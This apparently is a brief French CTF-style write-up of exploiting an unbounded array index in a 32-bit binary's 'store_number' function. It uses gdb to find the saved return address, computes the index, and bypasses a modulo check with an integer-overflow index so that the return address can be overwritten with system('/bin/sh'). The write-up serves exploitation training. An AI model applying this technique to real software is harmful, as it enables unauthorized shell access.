# 

le programme stock une valeur a [address de base + index*4]
ce qui fait un tableau d'adresse contenant des valeurs,
l'index n'est pas borné
le but est de trouver a quel index on ecrit dans le ret pour pouvoir le remplacer par system "/bin/sh"

disas main
0x080489f1 <+718>:	ret  -> le retour du main

info functions                                  -> store_number
disas store_number
0x080486ce <+158>:	mov    %edx,(%eax)          -> stock le nombre,
b *0x080486ce                                   -> breakpoint pour voir ou il est stocké

b *0x080489f1                                   -> breakpoint pour voir ou est stocké eip

run                                             -> run normal pour arriver au break

p/x $eax -> pour voir a quelle adresse est stocké notre nombre
$1 = 0xffffd548 -> on retire 4 pour l'adresse de base car l'index 0 est bloqué

c -> pour aller au second breakpoint

info frame
    Saved registers:
        eip at 0xffffd70c

p/x $esp -> pour voir que esp pointe sur eip
$1 = 0xffffd70c

donc pour tomber sur eip il faut faire :
index_eip = 1 + (0xffffd70c - 0xffffd548) / 4

index_eip = 114

il y a une verification, l'index %3 ne doit pas etre egale a 0.

Pour contourner ca on fait 114 + 2^31 = 2147483762

le contournement n'est pas necessaire pour 115 et 116


## Reverse engineering

## Exploitation
